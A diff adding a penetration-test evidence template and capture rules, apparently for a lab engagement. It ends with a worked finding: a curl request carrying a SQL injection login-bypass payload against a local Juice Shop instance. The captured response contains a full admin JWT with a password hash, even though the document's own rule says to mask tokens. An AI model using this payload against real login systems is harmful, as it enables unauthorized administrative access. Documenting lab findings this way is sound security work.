@@ -1,0 +1,46 @@
+================================================================
+FINDING: F-XX [short title] — [SEVERITY]
+Target: [url]   Captured: [UTC timestamp]
+----------------------------------------------------------------
+COMMAND:
+<exact copy-paste-ready command — a reader must reproduce it in one attempt>
+
+----------------------------------------------------------------
+RAW RESPONSE (<N> bytes) — unedited, full capture:
+<paste the complete server response: headers if relevant + body. Never summarize inside the raw section.>
+
+----------------------------------------------------------------
+VERIFICATION NOTE:
+Expected per hypothesis: [one line — what would prove the flaw]
+Observed: [one line — what the raw response actually shows] CONFIRMED / NOT CONFIRMED.
+(Retained above unedited.)
+================================================================
+```
+
+## Rules
+1. **Raw response is sacred** — no trimming, no redaction, no commentary inside the RAW section. Commentary lives in VERIFICATION NOTE.
+2. **One finding, one file.** Multi-step proofs (e.g., F-04's register→login→read chain) go in one file as numbered COMMAND/RESPONSE pairs, in order.
+3. **State-mutating proofs** (PUT/POST/DELETE): note the mutation in the verification note, capture before/after responses, and restore state where safe. If mutation can't be undone, cite the session capture instead and say so.
+4. **Disproven hypotheses get files too** (`F-XX-DISPROVEN-*.txt`) — a negative with a root cause is rigidity evidence; auditors and clients both read the appendix.
+5. **Timestamps in UTC**, captured-by named. Append-only: corrections are new blocks, never edits.
+6. **Never include client secrets in evidence** — mask tokens/keys where they're not the finding itself (e.g., show first 20 chars of a JWT, not the whole signature).
+7. Companion transcript: the full session export goes in `02-evidence/session-transcript-<date>.txt` — the per-finding files are the index, the transcript is the raw history.
+
+## Worked example
+See `clients/2026-10-juice-shop-lab/02-evidence/F-01-sqli.txt` — the reference implementation of this structure.
+
+## Naming convention
+`F-XX-shortname.txt` matching the report's finding IDs exactly. Disproven: `F-XX-DISPROVEN-reason.txt`. Multi-part: `F-XX-part1-*.txt`, `F-XX-part2-*.txt`.
+
+----------------------------------------------------------------
+CAPTURE: 2026-10-27 22:30:00 UTC · HTTP 200 · 784 bytes
+COMMAND:
+curl -s -X POST -H Content-Type: application/json --data-binary {"email":"' or 1=1--@juice-sh.op","password":"x"} http://127.0.0.1:3000/rest/user/login
+----------------------------------------------------------------
+RAW RESPONSE (784 bytes) — unedited, full capture:
+{"authentication":{"token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJkYXRhIjp7ImlkIjoxLCJ1c2VybmFtZSI6IiIsImVtYWlsIjoiYWRtaW5AanVpY2Utc2gub3AiLCJwYXNzd29yZCI6IjAxOTIwMjNhN2JiZDczMjUwNTE2ZjA2OWRmMThiNTAwIiwicm9sZSI6ImFkbWluIiwiZGVsdXhlVG9rZW4iOiIiLCJsYXN0TG9naW5JcCI6IiIsInByb2ZpbGVJbWFnZSI6ImFzc2V0cy9wdWJsaWMvaW1hZ2VzL3VwbG9hZHMvZGVmYXVsdEFkbWluLnBuZyIsInRvdHBTZWNyZXQiOiIiLCJpc0FjdGl2ZSI6dHJ1ZSwiY3JlYXRlZEF0IjoiMjAyNi0xMC0yNyAyMDoxMzozMy45MzYgKzAwOjAwIiwidXBkYXRlZEF0IjoiMjAyNi0xMC0yNyAyMDoxMzozMy45MzYgKzAwOjAwIiwiZGVsZXRlZEF0IjpudWxsfSwiYmlkIjoxLCJpYXQiOjE3OTMxNDAyMDF9.Dp2GEu7Ao6E-frFGE3bdiw7wEdepTlybFYJo9RIuz6UaIXRyuMkCOgwskinOOpsNYIczxpmujjVFPYNDrEoCXywIXwcHc6G7qMlZL9pqH5sxvno3VrRrJIZBYb7HvdAFBX2pn9Oit-a5ZKo-A0xrG7E7S8h4Bxw3IT8e2u3qvYo","bid":1,"umail":"admin@juice-sh.op"}}
+VERIFICATION NOTE:
+Expected per hypothesis: POST with email "' or 1=1--@juice-sh.op" returns HTTP 200 + valid admin token without a correct password.
+Observed: HTTP 200; token payload decodes to {"id":1,"email":"admin@juice-sh.op","role":"admin"}. CONFIRMED.
+Captured by: Forefront Security
+----------------------------------------------------------------
